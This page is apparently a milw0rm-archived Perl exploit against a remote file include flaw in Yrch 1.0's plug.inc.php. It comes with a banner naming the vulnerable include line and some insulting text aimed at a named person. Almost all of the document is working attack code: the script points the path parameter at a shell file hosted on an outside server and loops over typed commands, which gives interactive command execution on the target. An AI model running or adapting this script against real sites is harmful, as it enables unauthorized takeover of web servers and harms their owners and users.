<html><head><title>Yrch 1.0 (plug.inc.php path variable) Remote File Include Exploit</title></head><pre>#!/usr/bin/perl

##########################################################################################################
#                                                                                                        #
# Yrch! v1.0 Hierarchised Website Directories (plug.inc.php)Remote File Include Vulnerability            #
#                                                                                                        # 
# Bug Found : DeltahackingTEAM discovery:Dr.Pantagon &amp; Exploitet By Dr.Trojan contact Dr.Trojan[a]DeltaSecurity.ir   #
#                                                                                                        #
# Class:  Remote File Include Vulnerability                                                              #
#                                                                                                        #
# exemplary Exp: http://lashiyane.org/[path]/yrch/plugins/metasearch/plug.inc.php?path=[                 #
#                                                                                                        #
# Remote: Yes                                                                                            #
#                                                                                                        #
# Type:   Highly critical                                                                                #
#                                                                                                        #
# Vulnerable Code:include_once($path.&quot;metasearch.class.php&quot;);                                            #
#                                                                                                        #
# Download:http://switch.dl.sourceforge.net/sourceforge/yrch/Yrch.v1.0.zip                               #
#                                                                                                        #
# Ptach : www.Advistory.deltasecurity.ir                                                                 #
#                                                                                                        #
# Bug Found : DeltahackingTEAM Exploitet Discovered &amp;Exploitet: Dr.Trojan&lt;Dr.Trojan[A]Deltasecurity.ir   #
#                                                                                                        #
# Exploit: Yrch!.pl                                                                                      #
#                                                                                                        # 
# Web Site:www.deltasecurity.ir &lt;0Ur Server(Secure=99/999)www.takserver.ir&gt;                              # 
#                                                                                                        #                             
#SP FUCK.............: z_zer0c00l(floozie Mother Test 100%=z_zer0c00l=misbegotten:D)                     #
##########################################################################################################

use LWP::UserAgent;
use LWP::Simple;

$target = @ARGV[0];
$shellsite = @ARGV[1];
$shellcmd = @ARGV[2];
$file = &quot;plug.inc.php?path=&quot;;

if(!$target || !$shellsite)
{
    usage();
}

header();

print &quot;Type 'exit' to quit&quot;;
print &quot;[cmd]\$&quot;;
$cmd = &lt;STDIN&gt;;

while ($cmd !~ &quot;exit&quot;)
{
    $xpl = LWP::UserAgent-&gt;new() or die;
        $req =
HTTP::Request-&gt;new(GET=&gt;$target.$file.$shellsite.'?&amp;'.$shellcmd.'='.$cmd)
or die(&quot;\n\n Failed to connect.&quot;);
        $res = $xpl-&gt;request($req);
        $r = $res-&gt;content;
        $r =~ tr/[\n]/[&amp;#234;]/;

    if (@ARGV[4] eq &quot;-r&quot;)
    {
        print $r;
    }
    elsif (@ARGV[5] eq &quot;-p&quot;)
    {
    # if not working change cmd variable to null and apply patch manually.
    $cmd = &quot;echo if(basename(__FILE__) == basename(\$_SERVER['PHP_SELF'])) die(); &gt;&gt; list_last.inc&quot;;
    print q
    {

    }
    }
    else
    {
    print &quot;[cmd]\$&quot;;
    $cmd = &lt;STDIN&gt;;
    }
}

sub header()
{
    print q
    {
#################################################################################
                        Bug Found : DeltahackingTEAM
               Yrch!.pl  - Remote File Include Exploit
            Vulnerability discovered and exploitet by Dr.Trojan&amp;Dr.Pantagon
                          Dr.Trojan@Deltasecurity.ir
                www.DeltaSecurity.ir &amp;  www.Takserver.ir
#################################################################################
    };
}

sub usage()
{
header();
    print q
    {
########################################################################
Usage:
perl Yrch!.pl  &lt;Target website&gt; &lt;Shell Location&gt; &lt;CMD Variable&gt; &lt;-r&gt; &lt;-p&gt;
&lt;Target Website&gt; - Path to target eg: www.lashiyane.org/yrch/plugins/metasearch
&lt;Shell Location&gt; - Path to shell eg: d4wood.by.ru/cmd.gif
&lt;CMD Variable&gt; - Shell command variable name eg: Pwd
&lt;r&gt; - Show output from shell
&lt;p&gt; - plug.inc.php
Example:
perl Yrch!.pl http://localhost/include http://localhost/s.txt cmd -r -p
########################################################################
    };
exit();
}

# Farzad.SHarifi

# milw0rm.com [2006-12-27]</pre></html>